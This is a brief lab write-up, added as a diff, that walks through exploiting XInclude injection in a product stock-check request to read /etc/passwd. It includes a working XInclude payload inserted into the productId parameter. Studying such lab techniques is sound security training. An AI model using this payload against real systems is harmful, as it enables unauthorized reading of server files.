@@ -1,0 +1,12 @@
+Exploiting XInclude to retrieve files
+Goal: Exploit XXE Injection to retrieve the contents of /etc/passwd
+
+1)
+-Click a product
+-Check Stock
+-Send Post to Repeater
+-Add % after 1, Entities are not allowed
+
+2)
+-Put this after the 1 of the productId=1, <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+-Send
